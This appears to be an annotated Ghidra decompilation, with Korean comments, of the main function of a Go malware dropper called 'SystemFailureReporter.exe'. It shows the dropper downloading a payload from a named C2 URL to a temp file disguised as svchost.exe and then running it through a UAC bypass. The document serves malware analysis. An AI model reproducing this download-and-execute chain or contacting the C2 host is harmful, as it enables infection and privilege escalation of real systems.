@@ -1,0 +1,36 @@
+// SystemFailureReporter.exe - main.main 함수
+// Ghidra 디컴파일 분석
+
+void main.main(void) {
+    // 1. 임시 디렉터리 경로 획득
+    os.tempDir();
+    *(undefined8 *)((int)register0x00000020 + -0x28) = extraout_RAX;  // 임시 디렉터리 경로 포인터
+    *(undefined8 *)((int)register0x00000020 + -0x20) = extraout_RBX;  // 임시 디렉터리 경로 길이
+    
+    // 2. 타겟 파일명 설정
+    *(char **)((int)register0x00000020 + -0x18) = "svchost.exe";      // 파일명 문자열 포인터
+    *(undefined8 *)((int)register0x00000020 + -0x10) = 0xb;           // 파일명 길이
+    
+    // 3. 전체 파일 경로 생성 (TEMP_DIR + "/" + "svchost.exe")
+    path/filepath.join((undefined1 *)((int)register0x00000020 + -0x28), 2, 2);
+    *(undefined8 *)((int)register0x0000020 + -0x30) = extraout_RAX_00; // 결합된 파일 경로 포인터
+    *(undefined8 *)((int)register0x00000020 + -0x38) = extraout_RBX_00; // 결합된 파일 경로 길이
+    
+    // 4. C2 서버에서 악성 파일 다운로드
+    // http://drmon.chickenkiller.com/svchost -> TEMP_PATH/svchost.exe
+    main.downloadFile("http://drmon.chickenkiller.com/svchost",        // C2 URL
+                      0x26,                                            // URL 길이
+                      extraout_RAX_00,                                 // 저장할 파일 경로
+                      extraout_RBX_00);                                // 파일 경로 길이
+    
+    // 5. 다운로드 성공 시 UAC 우회 기법 실행
+    if (extraout_RAX_01 == 0) {                                       // 다운로드 성공시 IF 분기 시작
+        main.fod(*(undefined8 *)((int)register0x00000020 + -0x30),    // UAC 우회 + 실행
+                 *(undefined8 *)((int)register0x00000020 + -0x38));
+        return;
+    } else {
+        // 6. 다운로드 실패 시
+        uVar1 = *(undefined8 *)(extraout_RAX_01 + 8);
+        runtime.gopanic(uVar1, extraout_RBX_01);
+    }
+}
